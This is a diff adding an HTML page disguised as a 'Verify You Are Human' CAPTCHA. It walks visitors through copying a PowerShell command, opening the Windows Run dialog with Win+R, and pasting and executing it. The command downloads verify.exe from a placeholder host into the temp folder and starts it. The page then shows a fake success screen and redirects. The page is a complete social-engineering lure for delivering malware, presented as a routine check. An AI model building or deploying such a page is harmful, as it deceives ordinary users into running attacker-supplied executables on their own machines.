@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Human Verification</title>
+    <!-- Tailwind CSS v3 -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Font Awesome -->
+    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <!-- GSAP for animations -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#007bff',
+                        secondary: '#6c757d',
+                        success: '#28a745',
+                        danger: '#dc3545',
+                        dark: '#343a40',
+                        light: '#f8f9fa',
+                        'primary-dark': '#0056b3',
+                        'primary-light': '#e6f0ff',
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'system-ui', 'sans-serif'],
+                    },
+                    boxShadow: {
+                        'card': '0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04)',
+                        'button': '0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06)',
+                        'button-hover': '0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05)',
+                    },
+                    animation: {
+                        'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
+                    }
+                }
+            }
+        }
+    </script>
+    <style type="text/tailwindcss">
+        @layer utilities {
+            .text-shadow {
+                text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            }
+            .bg-gradient-primary {
+                background: linear-gradient(135deg, #007bff 0%, #0056b3 100%);
+            }
+            .bg-gradient-success {
+                background: linear-gradient(135deg, #28a745 0%, #218838 100%);
+            }
+            .transition-all-300 {
+                transition: all 300ms ease-in-out;
+            }
+            .glass-effect {
+                background: rgba(255, 255, 255, 0.8);
+                backdrop-filter: blur(10px);
+                -webkit-backdrop-filter: blur(10px);
+            }
+            .step-active {
+                border-color: #007bff;
+                background-color: #e6f0ff;
+            }
+            .step-completed {
+                border-color: #28a745;
+                background-color: #d4edda;
+            }
+            .code-block {
+                position: relative;
+                overflow-x: auto;
+            }
+            .code-block::before {
+                content: "";
+                position: absolute;
+                top: 0;
+                left: 0;
+                height: 100%;
+                width: 4px;
+                background-color: #007bff;
+                border-radius: 2px 0 0 2px;
+            }
+            .keyboard-key {
+                display: inline-flex;
+                align-items: center;
+                justify-content: center;
+                padding: 0.25rem 0.75rem;
+                margin: 0 0.25rem;
+                font-size: 0.875rem;
+                font-weight: 600;
+                color: #333;
+                background-color: #f8f9fa;
+                border: 1px solid #ccc;
+                border-radius: 4px;
+                box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            }
+        }
+    </style>
+</head>
+<body class="bg-gray-100 min-h-screen flex items-center justify-center p-4 font-sans">
+    <!-- Background decoration -->
+    <div class="fixed inset-0 overflow-hidden z-0">
+        <div class="absolute -top-40 -right-40 w-80 h-80 bg-primary-light rounded-full filter blur-3xl opacity-70"></div>
+        <div class="absolute -bottom-40 -left-40 w-80 h-80 bg-primary-light rounded-full filter blur-3xl opacity-70"></div>
+    </div>
+
+    <div class="relative z-10 w-full max-w-md">
+        <!-- Verification Card -->
+        <div id="verification-card" class="bg-white rounded-xl shadow-card overflow-hidden transition-all duration-500 transform hover:shadow-lg">
+            <!-- Card Header -->
+            <div class="bg-gradient-primary p-6 text-center">
+                <h1 class="text-2xl font-bold text-white mb-2 text-shadow">Verify You Are Human</h1>
+                <p class="text-white opacity-90">Please verify that you are a human to continue</p>
+            </div>
+            
+            <!-- Card Body -->
+            <div class="p-8">
+                <!-- Verification Button -->
+                <div id="verification-step" class="text-center">
+                    <button id="verify-button" class="flex items-center justify-center mx-auto bg-primary hover:bg-primary-dark text-white font-medium py-3 px-8 rounded-lg shadow-button hover:shadow-button-hover transition-all-300 focus:outline-none focus:ring-2 focus:ring-primary focus:ring-opacity-50">
+                        <i class="fa fa-shield mr-2"></i>
+                        I'm not a robot
+                    </button>
+                    <p class="mt-4 text-sm text-gray-500">Click the button to start verification</p>
+                </div>
+                
+                <!-- Step 1: Copy Code -->
+                <div id="step-1" class="hidden">
+                    <div class="flex items-center mb-4">
+                        <div class="w-8 h-8 rounded-full bg-primary text-white flex items-center justify-center font-bold">1</div>
+                        <h2 class="ml-3 text-xl font-semibold text-gray-800">Copy the Code</h2>
+                    </div>
+                    
+                    <p class="text-gray-600 mb-4">Click the code below to copy it to your clipboard:</p>
+                    
+                    <div class="code-block bg-gray-100 rounded-lg p-4 mb-4">
+                        <pre class="text-sm text-gray-800 whitespace-pre-wrap"><code id="code-snippet">powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://example.com/verify.exe', '$env:TEMP\verify.exe'); Start-Process '$env:TEMP\verify.exe'"</code></pre>
+                    </div>
+                    
+                    <button id="copy-button" class="w-full bg-primary hover:bg-primary-dark text-white font-medium py-2 px-4 rounded-lg shadow-button hover:shadow-button-hover transition-all-300 focus:outline-none focus:ring-2 focus:ring-primary focus:ring-opacity-50">
+                        <i class="fa fa-copy mr-2"></i>
+                        <span id="copy-text">Copy Code</span>
+                    </button>
+                    
+                    <div id="copy-success" class="hidden mt-3 p-3 bg-success bg-opacity-10 border border-success rounded-lg text-success text-sm flex items-center">
+                        <i class="fa fa-check-circle mr-2"></i>
+                        Code copied successfully!
+                    </div>
+                    
+                    <button id="step-1-next" class="mt-6 w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-medium py-2 px-4 rounded-lg shadow-button hover:shadow-button-hover transition-all-300 focus:outline-none focus:ring-2 focus:ring-gray-300 focus:ring-opacity-50">
+                        Next Step
+                    </button>
+                </div>
+                
+                <!-- Step 2: Open Run Dialog -->
+                <div id="step-2" class="hidden">
+                    <div class="flex items-center mb-4">
+                        <div class="w-8 h-8 rounded-full bg-primary text-white flex items-center justify-center font-bold">2</div>
+                        <h2 class="ml-3 text-xl font-semibold text-gray-800">Open Run Dialog</h2>
+                    </div>
+                    
+                    <p class="text-gray-600 mb-6">Press the following keyboard shortcut to open the Run dialog:</p>
+                    
+                    <div class="flex justify-center items-center mb-8">
+                        <div class="keyboard-key">Win</div>
+                        <span class="mx-2 text-gray-500">+</span>
+                        <div class="keyboard-key">R</div>
+                    </div>
+                    
+                    <div class="bg-gray-100 rounded-lg p-4 mb-6">
+                        <p class="text-center text-gray-700">
+                            <i class="fa fa-info-circle mr-2 text-primary"></i>
+                            This will open a small window where you can paste the code
+                        </p>
+                    </div>
+                    
+                    <button id="step-2-next" class="w-full bg-primary hover:bg-primary-dark text-white font-medium py-2 px-4 rounded-lg shadow-button hover:shadow-button-hover transition-all-300 focus:outline-none focus:ring-2 focus:ring-primary focus:ring-opacity-50">
+                        Next Step
+                    </button>
+                </div>
+                
+                <!-- Step 3: Paste and Execute -->
+                <div id="step-3" class="hidden">
+                    <div class="flex items-center mb-4">
+                        <div class="w-8 h-8 rounded-full bg-primary text-white flex items-center justify-center font-bold">3</div>
+                        <h2 class="ml-3 text-xl font-semibold text-gray-800">Paste and Execute</h2>
+                    </div>
+                    
+                    <p class="text-gray-600 mb-6">In the Run dialog, paste the code and press Enter:</p>
+                    
+                    <div class="flex justify-center items-center mb-2">
+                        <div class="keyboard-key">Ctrl</div>
+                        <span class="mx-2 text-gray-500">+</span>
+                        <div class="keyboard-key">V</div>
+                    </div>
+                    
+                    <p class="text-center text-gray-500 mb-6">Then press:</p>
+                    
+                    <div class="flex justify-center items-center mb-8">
+                        <div class="keyboard-key">Enter</div>
+                    </div>
+                    
+                    <div class="bg-gray-100 rounded-lg p-4 mb-6">
+                        <p class="text-center text-gray-700">
+                            <i class="fa fa-info-circle mr-2 text-primary"></i>
+                            This will execute the verification process
+                        </p>
+                    </div>
+                    
+                    <button id="verify-execution" class="w-full bg-gradient-success hover:bg-success text-white font-medium py-2 px-4 rounded-lg shadow-button hover:shadow-button-hover transition-all-300 focus:outline-none focus:ring-2 focus:ring-success focus:ring-opacity-50">
+                        <i class="fa fa-check mr-2"></i>
+                        I have executed the code
+                    </button>
+                </div>
+                
+                <!-- Verification Success -->
+                <div id="verification-success" class="hidden text-center">
+                    <div class="w-16 h-16 mx-auto bg-success bg-opacity-20 rounded-full flex items-center justify-center mb-4">
+                        <i class="fa fa-check text-2xl text-success"></i>
+                    </div>
+                    
+                    <h2 class="text-xl font-bold text-gray-800 mb-2">Verification Successful!</h2>
+                    <p class="text-gray-600 mb-6">You have been verified as a human. Redirecting to the page...</p>
+                    
+                    <div class="w-full bg-gray-200 rounded-full h-2.5 mb-6">
+                        <div id="progress-bar" class="bg-success h-2.5 rounded-full" style="width: 0%"></div>
+                    </div>
+                    
+                    <p class="text-sm text-gray-500">Redirecting in <span id="countdown">5</span> seconds...</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <div class="mt-6 text-center text-sm text-gray-500">
+            <p>This verification is to protect our system from automated abuse.</p>
+            <p class="mt-1">If you are having trouble, please contact support.</p>
+        </div>
+    </div>
+
+    <script>
+        // DOM Elements
+        const verifyButton = document.getElementById('verify-button');
+        const verificationStep = document.getElementById('verification-step');
+        const step1 = document.getElementById('step-1');
+        const step2 = document.getElementById('step-2');
+        const step3 = document.getElementById('step-3');
+        const verificationSuccess = document.getElementById('verification-success');
+        const copyButton = document.getElementById('copy-button');
+        const copyText = document.getElementById('copy-text');
+        const copySuccess = document.getElementById('copy-success');
+        const codeSnippet = document.getElementById('code-snippet');
+        const step1Next = document.getElementById('step-1-next');
+        const step2Next = document.getElementById('step-2-next');
+        const verifyExecution = document.getElementById('verify-execution');
+        const progressBar = document.getElementById('progress-bar');
+        const countdown = document.getElementById('countdown');
+        
+        // Animation timeline
+        const tl = gsap.timeline({ paused: true });
+        
+        // Verification button click handler
+        verifyButton.addEventListener('click', () => {
+            // Add loading state to button
+            verifyButton.disabled = true;
+            verifyButton.innerHTML = '<i class="fa fa-spinner fa-spin mr-2"></i> Verifying...';
+            
+            // Simulate verification process
+            setTimeout(() => {
+                // Hide verification step
+                gsap.to(verificationStep, {
+                    opacity: 0,
+                    y: -20,
+                    duration: 0.3,
+                    onComplete: () => {
+                        verificationStep.classList.add('hidden');
+                        
+                        // Show step 1
+                        step1.classList.remove('hidden');
+                        gsap.from(step1, {
+                            opacity: 0,
+                            y: 20,
+                            duration: 0.5
+                        });
+                    }
+                });
+            }, 1500);
+        });
+        
+        // Copy code button click handler
+        copyButton.addEventListener('click', () => {
+            // Copy code to clipboard
+            navigator.clipboard.writeText(codeSnippet.textContent)
+                .then(() => {
+                    // Show success message
+                    copyText.textContent = 'Copied!';
+                    copyButton.classList.remove('bg-primary', 'hover:bg-primary-dark');
+                    copyButton.classList.add('bg-success', 'hover:bg-green-600');
+                    copySuccess.classList.remove('hidden');
+                    
+                    // Animate success message
+                    gsap.from(copySuccess, {
+                        opacity: 0,
+                        y: -10,
+                        duration: 0.3
+                    });
+                    
+                    // Enable next button
+                    step1Next.classList.remove('bg-gray-200', 'hover:bg-gray-300');
+                    step1Next.classList.add('bg-primary', 'hover:bg-primary-dark', 'text-white');
+                    step1Next.disabled = false;
+                })
+                .catch(err => {
+                    console.error('Failed to copy code: ', err);
+                });
+        });
+        
+        // Step 1 next button click handler
+        step1Next.addEventListener('click', () => {
+            // Hide step 1
+            gsap.to(step1, {
+                opacity: 0,
+                y: -20,
+                duration: 0.3,
+                onComplete: () => {
+                    step1.classList.add('hidden');
+                    
+                    // Show step 2
+                    step2.classList.remove('hidden');
+                    gsap.from(step2, {
+                        opacity: 0,
+                        y: 20,
+                        duration: 0.5
+                    });
+                }
+            });
+        });
+        
+        // Step 2 next button click handler
+        step2Next.addEventListener('click', () => {
+            // Hide step 2
+            gsap.to(step2, {
+                opacity: 0,
+                y: -20,
+                duration: 0.3,
+                onComplete: () => {
+                    step2.classList.add('hidden');
+                    
+                    // Show step 3
+                    step3.classList.remove('hidden');
+                    gsap.from(step3, {
+                        opacity: 0,
+                        y: 20,
+                        duration: 0.5
+                    });
+                }
+            });
+        });
+        
+        // Verify execution button click handler
+        verifyExecution.addEventListener('click', () => {
+            // Add loading state to button
+            verifyExecution.disabled = true;
+            verifyExecution.innerHTML = '<i class="fa fa-spinner fa-spin mr-2"></i> Verifying...';
+            
+            // Simulate verification process
+            setTimeout(() => {
+                // Hide step 3
+                gsap.to(step3, {
+                    opacity: 0,
+                    y: -20,
+                    duration: 0.3,
+                    onComplete: () => {
+                        step3.classList.add('hidden');
+                        
+                        // Show verification success
+                        verificationSuccess.classList.remove('hidden');
+                        gsap.from(verificationSuccess, {
+                            opacity: 0,
+                            y: 20,
+                            duration: 0.5
+                        });
+                        
+                        // Animate progress bar
+                        gsap.to(progressBar, {
+                            width: '100%',
+                            duration: 5,
+                            ease: 'power1.inOut'
+                        });
+                        
+                        // Countdown timer
+                        let seconds = 5;
+                        const countdownInterval = setInterval(() => {
+                            seconds--;
+                            countdown.textContent = seconds;
+                            
+                            if (seconds <= 0) {
+                                clearInterval(countdownInterval);
+                                // Redirect to success page
+                                window.location.href = 'https://example.com/success';
+                            }
+                        }, 1000);
+                    }
+                });
+            }, 2000);
+        });
+        
+        // Initialize the page
+        document.addEventListener('DOMContentLoaded', () => {
+            // Disable next buttons initially
+            step1Next.disabled = true;
+            
+            // Add hover effect to code block
+            codeSnippet.parentElement.parentElement.addEventListener('mouseenter', () => {
+                gsap.to(codeSnippet.parentElement.parentElement, {
+                    scale: 1.01,
+                    duration: 0.2
+                });
+            });
+            
+            codeSnippet.parentElement.parentElement.addEventListener('mouseleave', () => {
+                gsap.to(codeSnippet.parentElement.parentElement, {
+                    scale: 1,
+                    duration: 0.2
+                });
+            });
+        });
+    </script>
+</body>
+</html>
